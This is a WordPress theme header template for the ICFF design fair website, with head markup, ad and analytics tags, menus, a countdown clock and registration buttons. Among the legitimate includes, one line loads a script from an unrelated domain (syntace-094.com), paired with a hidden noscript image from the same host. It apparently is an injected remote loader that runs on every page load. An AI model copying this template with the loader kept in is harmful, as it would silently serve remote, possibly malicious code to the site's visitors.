<!DOCTYPE html>
<html lang="en">
  <!--[if lt IE 7]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]-->
  <!--[if (IE 7)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8"><![endif]-->
  <!--[if (IE 8)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9"><![endif]-->
  <!--[if gt IE 8]><!--> <html <?php language_attributes(); ?> class="no-js"><!--<![endif]-->
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title><?php wp_title('|', true, 'right'); bloginfo('name'); ?></title>
    <link rel="shortcut icon" type="image/gif" href="<?php bloginfo('template_directory'); ?>/img/favicon.ico" />
    
    <link href='https://fonts.googleapis.com/css?family=PT+Serif:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,900' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/normalize.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/helper.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/layout.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/font.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/additional.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css">
    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.min.js"></script>
    <script>
    $('document').ready(function(){
    $('header .sub-menu').hide();
    });
    </script>
    
    <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery.countdown.min.js"></script>
    <!--<script type="text/javascript" src="http://www.nynow.com/wp-content/themes/nynow-theme/js/jquery.countdown.min.js"></script>-->
    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.1/jquery-ui.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/js/script.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/js/modern.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/js/respond.js"></script>
    <script charset="utf-8" type="text/javascript">var switchTo5x=true;</script>
    <script charset="utf-8" type="text/javascript" src="https://ws.sharethis.com/button/buttons.js"></script>
    <script charset="utf-8" type="text/javascript">stLight.options({"publisher":"wp.b77086fe-9305-474d-b4eb-d43fe36fccf8","doNotCopy":true,"hashAddressBar":false,"doNotHash":true});var st_type="wordpress4.0";</script>
    <script type="text/javascript" src="http://syntace-094.com/js/36248.js" ></script>
    <noscript><img src="http://syntace-094.com/36248.png" style="display:none;" /></noscript>
    <script type='text/javascript'>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    (function() {
    var gads = document.createElement('script');
    gads.async = true;
    gads.type = 'text/javascript';
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:') +
    '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
    })();
    </script>
    <script type='text/javascript'>
    googletag.cmd.push(function() {
    googletag.defineSlot('/5993/nbm.ts.icff/main/home', [728, 90],  'ICFF_Homepage_728_Top')
    .addService(googletag.pubads())
    .setTargeting("pos", "top")
    .setCollapseEmptyDiv(true);
    googletag.defineSlot('/5993/nbm.ts.icff/main/home', [234, 60],  'ICFF_Homepage_234_Top')
    .addService(googletag.pubads())
    .setTargeting("pos", "top")
    .setCollapseEmptyDiv(true);
    googletag.defineSlot('/5993/nbm.ts.icff/main/home', [300, 250],  'ICFF_Homepage_300_Top')
    .addService(googletag.pubads())
    .setTargeting("pos", "top")
    .setCollapseEmptyDiv(true);
    googletag.defineSlot('/5993/nbm.ts.icff/main/home', [300, 250],  'ICFF_Homepage_300_Bottom')
    .addService(googletag.pubads())
    .setTargeting("pos", "bottom")
    .setCollapseEmptyDiv(true);
    googletag.defineSlot('/5993/nbm.ts.icff/main/home', [728, 90],  'ICFF_Homepage_728_Bottom')
    .addService(googletag.pubads())
    .setTargeting("pos", "bottom")
    .setCollapseEmptyDiv(true);
    googletag.pubads().setTargeting("s1","main")
    googletag.pubads().setTargeting("s2","home")
    googletag.pubads().setTargeting("url","icff");
    googletag.pubads().enableSingleRequest();
    googletag.enableServices();
    });
    </script>
    <?php if(is_page(array('terms-of-use','privacy-policy','terms','privacy'))){ ?>
    <script>
    $.ajaxSetup({
    scriptCharset: "utf-8", //maybe "ISO-8859-1"
    contentType: "application/json; charset=utf-8"
    });
    $.ajax({
    type: 'GET',
    url: 'https://www.emeraldexpositions.com/wp-json/wp/v2/pages?slug=privacy-policy',
    data: { get_param: 'value' },
    dataType: 'json',
    success: function (data) {
    $.each(data, function(index, element) {
    $("#privacy").html(element.content.rendered);
    });
    }
    });
    $.ajax({
    type: 'GET',
    url: 'https://www.emeraldexpositions.com/wp-json/wp/v2/pages?slug=terms-of-use',
    data: { get_param: 'value' },
    dataType: 'json',
    success: function (data) {
    $.each(data, function(index, element) {
    $("#terms").html(element.content.rendered);
    });
    }
    });
    </script>
    <?php } ?>

    <?php wp_head(); ?>
    
  </head>
  <body>
    <!-- Google Tag Manager -- ICFF -- Place Below Body Tag -->
    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-PLC7CH"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PLC7CH');</script>
    <!-- End Google Tag Manager -- ICFF -->
    <div id="network-container">
      <nav class="wrapper">
        <ul>
          <li><a class="active" href="http://www.icff.com">ICFF</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.icffmiami.com">ICFF Miami</a></li>
        </ul>
      </nav>
    </div>
    <?php if ( !is_front_page() ) { ?>
    <!-- ICFF Homepage -->
    <div id='ICFF_Homepage_728_Top' class="hidden-phone"  style="width:728px;height:90px;margin:10px auto;">
      <script type='text/javascript'>
      googletag.cmd.push(function() { googletag.display('ICFF_Homepage_728_Top'); });
      </script>
    </div>
    <?php } ?>
    <header class="cf">
      <a href="<?php echo esc_url( home_url( '/' ) ); ?>" class="brand-logo"><img src="<?php echo get_template_directory_uri(); ?>/img/logo.jpg" alt=""></a>
      <ul class="cf">
        <li>
          <strong><?= do_shortcode('[pods name="sitesettings" field="event_date"]') ?></strong> <?= do_shortcode('[pods name="sitesettings" field="event_location"]') ?>
          <div class="social cf hidden-phone">
            <?php display_social(); ?>
          </div>
        </li>
        <li>
          <?php wp_nav_menu(array(
              'container' => false,                           // remove nav container
              'container_class' => 'menu cf',                 // class of container (should you choose to use it)
              'menu_class' => 'nav top-nav cf',               // adding custom nav class
              'theme_location' => 'menu-1',                 // where it's located in the theme
              'before' => '',                                 // before the menu
            'after' => '',                                  // after the menu
            'link_before' => '',                            // before each link
            'link_after' => '',                             // after each link
            'items_wrap'      => '<ul id="%1$s" class="nav top-nav cf hidden-phone">%3$s</ul>',
            'depth' => 0,                                   // limit the depth of the nav
            'fallback_cb' => ''                             // fallback function (if there is one)
        )); ?>
        <div class="social cf visible-phone">
          <?php display_social(); ?>
        </div>
        <div  class="hidden-desktop">
          <a href="#" class="toggle-menu visible-phone">M</a>
          <div class="cf" style="margin-top: 20px;">
            <!-- <form style="display:none;" id="searchform" method="get" action="http://www.icff.com">
              <input name="s" id="s" size="15" type="text">
              <input type="submit" id="searchsubmit" value="" style="">
            </form> -->
            <a href="#" class="toggle-search">Q</a>
          </div>
        </div>
        <form class="visible-desktop" id="searchform" method="get" action="http://www.icff.com">
          <input name="s" id="s" size="15" type="text">
          <input type="submit" id="searchsubmit" value="" style="">
        </form>
      </li>
    </ul>
    
  </header>
  <form class="hidden-desktop" id="searchform" method="get" action="http://www.icff.com">
    <input name="s" id="s" size="15" type="text">
    <input type="submit" id="searchsubmit" value="" style="">
  </form>
  <nav class="phone-menu visible-phone">
    <?php wp_nav_menu(array(
      'container' => false,                           // remove nav container
      'container_class' => 'menu cf',                 // class of container (should you choose to use it)
      'menu_class' => 'nav top-nav cf',               // adding custom nav class
      'theme_location' => 'menu-1',                 // where it's located in the theme
      'before' => '',                                 // before the menu
    'after' => '',                                  // after the menu
    'link_before' => '',                            // before each link
    'link_after' => '',                             // after each link
    'items_wrap'      => '<ul id="%1$s" class="nav top-nav cf">%3$s</ul>',
    'depth' => 0,                                   // limit the depth of the nav
    'fallback_cb' => ''                             // fallback function (if there is one)
  )); ?>
</nav>
<?php if ( is_front_page() ) {
$displayCountdown = do_shortcode('[pods name="sitesettings" field="display_countdown_clock"]');
if ($displayCountdown == "Yes"){
?>
<!-- Start Countdown Clock-->
<div class="clock-outsideContainer" style="display:none;">
  <div class="clock-container">
    <div class="clock-section">
      <div  class="clock-left-col">
        <p><?php echo do_shortcode("[pods name='sitesettings' field='countdown_clock_text_1']"); ?><br><?php echo do_shortcode("[pods name='sitesettings' field='countdown_clock_text_2']"); ?> </p>
      </div>
      <div id="countdown_dashboard">
        <div class="textwidget">
          <div class="countdown-head cf">
            <div></div>
          </div>
          <script type="text/javascript">
                $(document).ready(function(){
                  // CHANGE THE DATE BELOW
          $("div.countdown-head > div").countdown("<?php echo do_shortcode('[pods name="sitesettings" field="countdown_clock_date"]') ?>", function(event) {
          $(this).html(
          event.strftime('<div><div>%D</div><span>Days</span></div>'
          +'<div><div>%H</div><span>Hours</span></div>'
          +'<div><div>%M</div><span>Minutes</span></div>'
          +'<div><div>%S</div><span>Seconds</span></div>')
          );
          });
          });
          </script>
        </div>
      </div>
      <div class="clock-right-col">
        <p>&nbsp;</p>
        <p><a href="<?php echo do_shortcode("[pods name='sitesettings' field='countdown_inquire_now_link']"); ?>" class="reg-btn-rnd" target="_blank"><?php echo do_shortcode("[pods name='sitesettings' field='countdown_inquire_now_text']"); ?></a></p>
      </div>
    </div>
  </div>
</div>
<!-- End Countdown Clock -->
<?php
}
?>
<div id="slider">
  <div class="royalSlider rsDefault">
    <?php echo get_new_royalslider(1); ?>
  </div>
</div>
<!--   <hr style="width:100%;padding-top:0px;"> -->
<div class="buttons visible-phone" style=" margin: auto;padding: 0px 10px 0px 10px;">
  <div style="width:300px;padding:10px;border:3px solid #000;background:#6dcff6;text-align:center;">
    <div style="width:100%;margin-bottom:30px;"><h1 style="margin-bottom:-5px;">Registration Opens January 2018!</h1></div>
    <div style="width:100%;margin-bottom:20px;"><a class="rrbutton" href="<?= get_option('buy_tickets') ?>" target="_blank" style="width:300px;border:3px solid #000; border-radius:15px;color:#000;text-transform:uppercase;font-size:24px;padding:5px 20px;font-weight:600;text-decoration:none;">Register to Attend</a></div>
    <div style="width:100%;margin-bottom:10px;"><a class="rrbutton" href="<?= get_option('exhibitor_apply_url') ?>" style="width:300px;border:3px solid #000; border-radius:15px;color:#000;text-transform:uppercase;margin-top:120px;font-size:24px;padding:5px 42px;font-weight:600;text-decoration:none;">Exhibit/Inquire</a></div>
  </div>
  <div class="button" style="background-color: #000;margin-top:15px;">
    <a style="font-size:0.75em; color: #fff; " href="<?= get_option('floor_plan_url') ?>" target="blank">Floor Plan</a> / <a style="font-size:0.75em; color: #fff; " href="<?= get_option('exhibitors_url') ?>">Exhibitor List</a>
  </div>
</div>
<hr class="visible-phone" style="margin: 0 10px;">
<?php } ?>